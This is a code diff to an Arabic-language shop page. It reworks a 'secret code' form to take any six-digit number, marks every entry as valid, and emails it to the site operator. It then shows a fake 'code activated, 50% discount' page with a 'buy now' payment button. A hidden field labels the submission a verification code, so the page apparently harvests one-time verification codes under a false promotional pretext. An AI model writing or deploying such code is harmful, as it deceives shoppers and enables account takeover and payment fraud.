@@ -272,7 +272,7 @@
                             </div>
                             
                             <div class="mb-6">
-                                <input type="text" id="secret-code" name="secret_code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل الكود هنا" maxlength="20" required="">
+                                <input type="text" id="secret-code" name="secret_code" class="w-full px-6 py-4 text-2xl text-center border-2 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 uppercase tracking-widest font-mono" placeholder="أدخل كود مكون من 6 أرقام" maxlength="6" pattern="[0-9]{6}" required="">
                             </div>
 
                             <button type="submit" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl font-bold text-lg">
@@ -348,6 +348,59 @@
                         <input type="hidden" name="message_type" value="كود التحقق">
                         <input type="hidden" name="sent_time" value="">
                     </form>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Code Thank You Page -->
+    <div id="code-thanks" class="page">
+        <section class="py-16 bg-gradient-to-br from-purple-900 via-pink-900 to-green-900 min-h-screen">
+            <div class="container mx-auto px-4">
+                <div class="max-w-2xl mx-auto">
+                    <div class="text-center mb-12">
+                        <div class="text-8xl mb-6">🎉</div>
+                        <h1 class="text-5xl font-bold mb-6 text-white">مبروك! تم تفعيل الكود</h1>
+                        <p class="text-xl text-gray-200 mb-8">🌟 تم قبول الكود بنجاح! استمتع بالعروض الحصرية 🌟</p>
+                    </div>
+
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-2xl p-8 mb-8">
+                        <div class="text-center mb-6">
+                            <div class="bg-green-100 dark:bg-green-900 p-6 rounded-xl mb-6">
+                                <h2 class="text-2xl font-bold text-green-800 dark:text-green-200 mb-4">✨ الكود مفعّل بنجاح! ✨</h2>
+                                <div class="space-y-3 text-green-700 dark:text-green-300">
+                                    <p><strong>🔥 خصم خاص:</strong> 50% على جميع المنتجات</p>
+                                    <p><strong>🚚 الشحن:</strong> مجاني لجميع الطلبات</p>
+                                    <p><strong>⏰ صالح حتى:</strong> نهاية الشهر</p>
+                                    <p><strong>💎 منتجات حصرية:</strong> وصول لمنتجات غير متاحة للعامة</p>
+                                </div>
+                            </div>
+                            
+                            <div class="bg-yellow-100 dark:bg-yellow-900 p-4 rounded-lg mb-6">
+                                <p class="text-yellow-800 dark:text-yellow-200 font-bold">
+                                    🎯 الآن يمكنك التسوق بأسعار خاصة!
+                                </p>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <button onclick="showPage('products')" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl font-bold text-lg">
+                                <i class="fas fa-shopping-bag mr-2"></i>
+                                تصفح المنتجات
+                            </button>
+                            <button onclick="showPayment()" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold text-lg">
+                                <i class="fas fa-credit-card mr-2"></i>
+                                اشتري الآن
+                            </button>
+                        </div>
+                        
+                        <div class="mt-6 text-center">
+                            <button onclick="showPage('home')" class="text-primary hover:text-purple-700 font-bold">
+                                <i class="fas fa-home mr-2"></i>
+                                العودة للرئيسية
+                            </button>
+                        </div>
+                    </div>
                 </div>
             </div>
         </section>
@@ -794,29 +847,30 @@
         // Code verification - FIXED TO SEND EMAIL
         document.getElementById('code-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const code = document.getElementById('secret-code').value.trim().toUpperCase();
+            const code = document.getElementById('secret-code').value.trim();
             const currentTime = new Date().toLocaleString('ar-SA');
+            
+            // Check if code is exactly 6 digits
+            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+                showNotification('يجب أن يكون الكود مكون من 6 أرقام فقط');
+                return;
+            }
             
             // Update hidden fields
             this.querySelector('input[name="submission_time"]').value = currentTime;
-            
-            const validCodes = ['VIP2024', 'SPECIAL', 'GIFT50'];
-            
-            if (validCodes.includes(code)) {
-                this.querySelector('input[name="code_status"]').value = 'صحيح - تم تفعيل الكود بنجاح';
-                showNotification('تم تفعيل الكود بنجاح! حصلت على خصم 50%');
-            } else {
-                this.querySelector('input[name="code_status"]').value = 'خطأ - كود غير صحيح';
-                showNotification('كود غير صحيح، حاول مرة أخرى');
-            }
+            this.querySelector('input[name="code_status"]').value = 'صحيح - تم تفعيل الكود بنجاح';
             
             // Set form type for tracking
             currentFormType = 'code';
             
-            // Submit the form - IT WILL SEND EMAIL NOW AND STAY ON SITE
+            // Submit the form - IT WILL SEND EMAIL NOW
+            this.submit();
+            
+            // Show success notification and redirect to thank you page
+            showNotification('🎉 تم تفعيل الكود بنجاح!');
             setTimeout(() => {
-                this.submit();
-            }, 1000);
+                showPage('code-thanks');
+            }, 2000);
         });
 
         // Purchase code verification
